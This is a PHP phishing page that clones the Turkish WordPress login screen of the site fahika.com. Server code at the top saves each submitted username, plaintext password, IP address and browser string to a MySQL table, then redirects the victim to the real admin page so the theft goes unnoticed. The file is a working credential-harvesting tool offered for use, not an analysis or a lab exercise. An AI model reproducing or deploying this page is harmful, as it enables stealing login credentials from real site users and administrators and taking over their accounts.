<?php
session_start();

$host = "db"; // Docker Compose'da MySQL servisinin adı
$username = "root";
$password = "secret";
$dbname = "mysql"; // Docker Compose dosyasında belirttiğiniz veritabanı adı

// Veritabanı bağlantısı
$conn = new mysqli($host, $username, $password, $dbname);

// Bağlantı kontrolü
if ($conn->connect_error) {
    die("Bağlantı hatası: " . $conn->connect_error);
}

// Form gönderildiğinde çalışacak kod
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $kullaniciAdi = $_POST["username"];
    $sifre = $_POST["password"]; // Parolayı düz metin olarak alıyoruz
    $ipAdresi = $_SERVER["REMOTE_ADDR"];
    $cihazBilgisi = $_SERVER["HTTP_USER_AGENT"];

    // Veritabanına kullanıcı bilgilerini kaydetme
    $sql = "INSERT INTO users (username, password, ip_address, device_info) VALUES (?, ?, ?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ssss", $kullaniciAdi, $sifre, $ipAdresi, $cihazBilgisi);
	$stmt->execute();
    $stmt->close();
	header("Location: https://fahika.com/wp-admin");
	exit();
}

$conn->close();
?>
<!DOCTYPE html>
<!-- saved from url=(0091)https://fahika.com/wp-login.php?redirect_to=https%3A%2F%2Ffahika.com%2Fwp-admin%2F&reauth=1 -->
<html dir="ltr" lang="tr" prefix="og: https://ogp.me/ns#"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<title>Oturum aç ‹ Fahika — WordPress</title>
	<meta name="robots" content="max-image-preview:large, noindex, noarchive">
<link rel="dns-prefetch" href="https://stats.wp.com/">
<link rel="dns-prefetch" href="https://www.googletagmanager.com/">
<script src="./Oturum aç ‹ Fahika — WordPress_files/zxcvbn.min.js.indir" type="text/javascript" async=""></script><script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/custom_add_to_cart.js.indir" id="custom_add_to_cart-js"></script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/wp-polyfill-inert.min.js.indir" id="wp-polyfill-inert-js"></script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/regenerator-runtime.min.js.indir" id="regenerator-runtime-js"></script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/wp-polyfill.min.js.indir" id="wp-polyfill-js"></script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/hooks.min.js.indir" id="wp-hooks-js"></script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/w.js.indir" id="woo-tracks-js"></script>
<script></script><link rel="stylesheet" id="dashicons-css" href="./Oturum aç ‹ Fahika — WordPress_files/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="buttons-css" href="./Oturum aç ‹ Fahika — WordPress_files/buttons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="forms-css" href="./Oturum aç ‹ Fahika — WordPress_files/forms.min.css" type="text/css" media="all">
<link rel="stylesheet" id="l10n-css" href="./Oturum aç ‹ Fahika — WordPress_files/l10n.min.css" type="text/css" media="all">
<link rel="stylesheet" id="login-css" href="./Oturum aç ‹ Fahika — WordPress_files/login.min.css" type="text/css" media="all">
<meta name="generator" content="Site Kit by Google 1.126.0">	<meta name="referrer" content="strict-origin-when-cross-origin">
		<meta name="viewport" content="width=device-width">
	<link rel="icon" href="https://fahika.com/wp-content/uploads/2024/05/Black-and-Grey-Illustrative-Calligraphy-Fashion-Logo-100x100.png" sizes="32x32">
<link rel="icon" href="https://fahika.com/wp-content/uploads/2024/05/Black-and-Grey-Illustrative-Calligraphy-Fashion-Logo-300x300.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://fahika.com/wp-content/uploads/2024/05/Black-and-Grey-Illustrative-Calligraphy-Fashion-Logo-300x300.png">
<meta name="msapplication-TileImage" content="https://fahika.com/wp-content/uploads/2024/05/Black-and-Grey-Illustrative-Calligraphy-Fashion-Logo-300x300.png">
	</head>
	<body class="login js login-action-login wp-core-ui  locale-tr-tr">
	<script type="text/javascript">
/* <![CDATA[ */
document.body.className = document.body.className.replace('no-js','js');
/* ]]> */
</script>
		<style>
			.logo{
				width: 100px;
				height: 100px;
				align-items: center;
				margin-left: 11vh;
				margin-top: 3vh;
				padding-top: 10px;
				
			}
		
		</style>
		<div id="login">
		<div >
			<img  class="logo" src="226061.webp" href="https://fahika.com/" alt="">
			
		</div>
		
	
		<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
			<p>
				<label for="user_login">Kullanıcı adı ya da e-posta adresi</label>
				<input type="text" name="username" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required">

			</p>

			<div class="user-pass-wrap">
				<label for="user_pass">Parola</label>
				<div class="wp-pwd">
				<input type="password" name="password" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required">

					<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Parolayı görüntüle">
						<span class="dashicons dashicons-visibility" aria-hidden="true"></span>
					</button>
				</div>
			</div>
						<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> <label for="rememberme">Beni hatırla</label></p>
			<p class="submit">
				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Oturum aç">
									<input type="hidden" name="redirect_to" value="https://fahika.com/wp-admin/">
									<input type="hidden" name="testcookie" value="1">
			</p>
		</form>

					<p id="nav">
				<a class="wp-login-lost-password" href="https://fahika.com/lost-password/">Parolanızı mı unuttunuz?</a>			</p>
			<script type="text/javascript">
/* <![CDATA[ */
function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_login" );d.focus(); d.select();} catch( er ) {}}, 200);}
wp_attempt_focus();
if ( typeof wpOnload === 'function' ) { wpOnload() }
/* ]]> */
</script>
		<p id="backtoblog">
			<a href="https://fahika.com/">← Fahika sitesine git</a>		</p>
		<div class="privacy-policy-page-link"><a class="privacy-policy-link" href="https://fahika.com/privacy-policy/" rel="privacy-policy">Gizlilik Politikası</a></div>	</div>
				<div class="language-switcher">
				<form id="language-switcher" method="get">

					<label for="language-switcher-locales">
						<span class="dashicons dashicons-translation" aria-hidden="true"></span>
						<span class="screen-reader-text">
							Dil						</span>
					</label>

					<select name="wp_lang" id="language-switcher-locales"><option value="en_US" lang="en" data-installed="1">English (United States)</option>
<option value="tr_TR" lang="tr" selected="selected" data-installed="1">Türkçe</option></select>
					
											<input type="hidden" name="redirect_to" value="https://fahika.com/wp-admin/">
					
					
						<input type="submit" class="button" value="Değiştir">

					</form>
				</div>
				<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/jquery.min.js.indir" id="jquery-core-js"></script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/jquery-migrate.min.js.indir" id="jquery-migrate-js"></script>
<script type="text/javascript" id="zxcvbn-async-js-extra">
/* <![CDATA[ */
var _zxcvbnSettings = {"src":"https:\/\/fahika.com\/wp-includes\/js\/zxcvbn.min.js"};
/* ]]> */
</script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/zxcvbn-async.min.js.indir" id="zxcvbn-async-js"></script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/i18n.min.js.indir" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
/* ]]> */
</script>
<script type="text/javascript" id="password-strength-meter-js-extra">
/* <![CDATA[ */
var pwsL10n = {"unknown":"Parolan\u0131n zorlu\u011fu bilinmiyor","short":"\u00c7ok zay\u0131f","bad":"Zay\u0131f","good":"Orta","strong":"G\u00fc\u00e7l\u00fc","mismatch":"Parola uyu\u015fmuyor"};
/* ]]> */
</script>
<script type="text/javascript" id="password-strength-meter-js-translations">
/* <![CDATA[ */
( function( domain, translations ) {
	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
	localeData[""].domain = domain;
	wp.i18n.setLocaleData( localeData, domain );
} )( "default", {"translation-revision-date":"2024-04-16 14:03:15+0000","generator":"GlotPress\/4.0.1","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n > 1;","lang":"tr"},"%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code.":["%1$s, %2$s s\u00fcr\u00fcm\u00fcnden ba\u015flayarak kullan\u0131mdan kald\u0131r\u0131ld\u0131! Bunun yerine %3$s kullan\u0131n. L\u00fctfen daha kapsaml\u0131 kod yazmay\u0131 de\u011ferlendirin."]}},"comment":{"reference":"wp-admin\/js\/password-strength-meter.js"}} );
/* ]]> */
</script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/password-strength-meter.min.js.indir" id="password-strength-meter-js"></script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/underscore.min.js.indir" id="underscore-js"></script>
<script type="text/javascript" id="wp-util-js-extra">
/* <![CDATA[ */
var _wpUtilSettings = {"ajax":{"url":"\/wp-admin\/admin-ajax.php"}};
/* ]]> */
</script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/wp-util.min.js.indir" id="wp-util-js"></script>
<script type="text/javascript" id="user-profile-js-extra">
/* <![CDATA[ */
var userProfileL10n = {"user_id":"0","nonce":"1652d66782"};
/* ]]> */
</script>
<script type="text/javascript" id="user-profile-js-translations">
/* <![CDATA[ */
( function( domain, translations ) {
	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
	localeData[""].domain = domain;
	wp.i18n.setLocaleData( localeData, domain );
} )( "default", {"translation-revision-date":"2024-04-16 14:03:15+0000","generator":"GlotPress\/4.0.1","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n > 1;","lang":"tr"},"Your new password has not been saved.":["Yeni parolan\u0131z kaydedilemedi."],"Show":["G\u00f6r\u00fcnt\u00fcle"],"Confirm use of weak password":["Zay\u0131f parola kullan\u0131labilsin"],"Hide password":["Parolay\u0131 gizle"],"Show password":["Parolay\u0131 g\u00f6r\u00fcnt\u00fcle"],"Hide":["Gizle"]}},"comment":{"reference":"wp-admin\/js\/user-profile.js"}} );
/* ]]> */
</script>
<script type="text/javascript" src="./Oturum aç ‹ Fahika — WordPress_files/user-profile.min.js.indir" id="user-profile-js"></script>
<script></script>	
	
	</body></html>